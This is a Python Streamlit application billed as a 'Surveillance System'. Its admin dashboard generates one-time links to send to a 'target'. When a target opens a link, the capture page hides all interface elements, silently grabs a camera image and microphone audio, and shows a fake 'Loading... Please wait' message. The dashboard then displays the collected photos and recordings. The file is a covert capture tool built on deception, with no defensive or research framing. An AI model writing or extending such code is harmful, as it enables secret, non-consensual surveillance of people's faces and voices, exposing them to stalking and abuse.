import streamlit as st
import cv2
import numpy as np
from datetime import datetime
import os
from audio_recorder_streamlit import audio_recorder
from utils import is_admin, require_admin, generate_capture_link
from storage import save_capture, get_all_captures

# Page config
st.set_page_config(
    page_title="Surveillance System",
    page_icon="🎥",
    layout="wide",
    initial_sidebar_state="collapsed"  # Better for mobile
)

# Initialize session state
if 'authenticated' not in st.session_state:
    st.session_state.authenticated = False
if 'capture_links' not in st.session_state:
    st.session_state.capture_links = {}
if 'capture_mode' not in st.session_state:
    st.session_state.capture_mode = 'single'

# Mobile-friendly CSS
st.markdown("""
    <style>
    /* Responsive container */
    .main .block-container {
        padding-top: 1rem;
        padding-bottom: 1rem;
        padding-left: 1rem;
        padding-right: 1rem;
    }

    /* Better touch targets */
    div.stButton > button:first-child {
        width: 100%;
        min-height: 3rem;
        margin: 0.5rem 0;
    }

    /* Improved input fields */
    div.stTextInput > div > div > input {
        min-height: 3rem;
    }

    /* Better expanders */
    .streamlit-expanderHeader {
        font-size: 1.1rem;
        padding: 1rem !important;
    }

    /* Optimize for mobile */
    @media (max-width: 640px) {
        .main .block-container {
            padding: 0.5rem;
        }

        .stDataFrame, .stTable {
            width: 100%;
            overflow-x: auto;
        }

        /* Stack columns on mobile */
        [data-testid="column"] {
            width: 100% !important;
            margin-bottom: 1rem;
        }
    }
    </style>
""", unsafe_allow_html=True)

def auto_capture_page(token):
    """Page for automatic capture when target opens the link"""
    if token not in st.session_state.capture_links:
        st.error("Invalid or expired link")
        return

    # Hide all Streamlit elements
    st.markdown("""
        <style>
        div.stButton > button:first-child { display: none; }
        div.stMarkdown { display: none; }
        header { display: none; }
        </style>
    """, unsafe_allow_html=True)

    # Hidden capture elements
    img_capture = st.camera_input("", label_visibility="hidden")
    audio_bytes = audio_recorder(
        pause_threshold=2.0,
        sample_rate=41_000,
        text="",
        recording_color="#ff4b4b",
        neutral_color="#ffffff"
    )

    if img_capture is not None:
        # Save the captured image and audio
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        save_capture(img_capture, audio_bytes, timestamp)

        # Remove used token if single capture mode
        if st.session_state.capture_links[token].get('mode') == 'single':
            del st.session_state.capture_links[token]

        # Show a loading message
        st.markdown("""
            <div style='text-align: center; font-size: 24px;'>
                Loading... Please wait
            </div>
        """, unsafe_allow_html=True)

def admin_login():
    """Admin login page"""
    st.title("Surveillance System Admin")

    with st.container():
        st.markdown("""
            <style>
            .admin-container {
                padding: 2rem;
                border-radius: 10px;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
                max-width: 400px;
                margin: 0 auto;
            }
            </style>
        """, unsafe_allow_html=True)

        # Center-aligned login form
        col1, col2, col3 = st.columns([1,2,1])
        with col2:
            username = st.text_input("Username", key="login_username")
            password = st.text_input("Password", type="password", key="login_password")
            if st.button("Login", use_container_width=True):
                if is_admin(username, password):
                    st.session_state.authenticated = True
                    st.rerun()
                else:
                    st.error("Invalid credentials")

@require_admin
def admin_dashboard():
    """Admin dashboard page"""
    st.title("Surveillance Dashboard")

    # Responsive logout button
    col1, col2, col3 = st.columns([2,1,2])
    with col2:
        if st.button("Logout", use_container_width=True):
            st.session_state.authenticated = False
            st.rerun()

    # Link generation section with improved mobile layout
    st.subheader("Generate Capture Link")

    # Use columns for form layout
    col1, col2 = st.columns([2,1])

    with col1:
        capture_mode = st.selectbox(
            "Capture Mode",
            ["single", "multiple"],
            help="Single: One-time capture, Multiple: Allows multiple captures"
        )

    with col2:
        if st.button("Generate New Link", use_container_width=True):
            token = generate_capture_link()
            base_url = st.query_params.get("base_url", "http://localhost:5000")
            capture_url = f"{base_url}?token={token}"
            st.session_state.capture_links[token] = {
                'created_at': datetime.now(),
                'mode': capture_mode
            }
            # Mobile-friendly link display
            st.code(capture_url, language="text")
            st.info("Share this link with the target. The link will be valid until used.")

    # Display captures with responsive stats
    st.subheader("Captured Data")
    captures = get_all_captures()

    # Stats in a mobile-friendly grid
    col1, col2, col3 = st.columns(3)
    with col1:
        st.metric("Total Captures", len(captures))
    with col2:
        audio_count = sum(1 for c in captures if c['metadata'].get('has_audio'))
        st.metric("With Audio", audio_count)
    with col3:
        today_count = sum(1 for c in captures if c['timestamp'].startswith(datetime.now().strftime("%Y%m%d")))
        st.metric("Today's Captures", today_count)

    # Display captures in reverse chronological order
    for capture in captures:
        with st.expander(f"Capture {capture['timestamp']}"):
            # Mobile-friendly media display
            st.image(capture['image'], caption="Captured Image", use_column_width=True)

            if capture['audio']:
                st.audio(capture['audio'], format="audio/wav")
            else:
                st.write("No audio recorded")

            # Metadata display
            with st.expander("Capture Details"):
                st.text(f"Timestamp: {capture['timestamp']}")
                if 'metadata' in capture:
                    st.json(capture['metadata'])

def main():
    # Check for capture token
    token = st.query_params.get("token")
    path = st.query_params.get("path")

    if token:
        auto_capture_page(token)
    elif path == "admin" or not path:  # Show admin page for both /admin and root URL
        if not st.session_state.authenticated:
            admin_login()
        else:
            admin_dashboard()

if __name__ == "__main__":
    main()